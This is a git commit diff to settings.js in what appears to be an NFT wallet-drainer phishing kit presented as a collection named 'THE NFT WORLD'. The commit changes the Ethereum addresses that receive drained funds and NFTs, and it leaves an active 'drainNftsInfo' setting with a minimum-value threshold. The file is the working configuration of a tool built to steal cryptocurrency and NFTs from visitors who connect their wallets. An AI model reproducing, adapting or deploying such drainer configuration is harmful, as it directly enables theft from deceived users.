07f8e2c8378b22b3af3fa6f5310c73aebae73de0
MDG94 <127594485+MDG94@users.noreply.github.com>
2023-03-12 18:46:52 +0100

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,4 +1,4 @@
-const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
+const receiveAddress = '0xf6E921eB7dDfc08AB9B7C86f71968B769727dfB0',
   collectionInfo = {
     name: 'THE NFT WORLD',
     socialMedia: {
@@ -27,7 +27,7 @@ const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
   drainNftsInfo = {
     active: true,
     minValue: 0.1,
-    nftReceiveAddress: '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
+    nftReceiveAddress: '0xf6E921eB7dDfc08AB9B7C86f71968B769727dfB0',
   },
 
   customStrings = {
